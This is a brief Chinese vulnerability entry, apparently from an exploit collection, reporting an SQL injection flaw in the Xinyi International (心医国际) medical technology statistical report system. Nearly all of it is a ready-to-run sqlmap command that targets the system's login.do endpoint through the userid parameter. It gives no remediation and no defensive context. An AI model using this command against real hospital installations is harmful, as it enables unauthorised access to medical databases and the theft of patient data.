# 心医国际医技统计报表系统存在SQL注入漏洞

心医国际医技统计报表系统 ｜ SQL注入 ｜ —

**Payload**
```
python3 sqlmap.py -u "http://127.0.0.1/EasyReport/login.do?method=handleRequestRole&t=731&userid=admin&_=1714374538731" -p userid
>
```
- **其他**：版本: 心医国际医技统计报表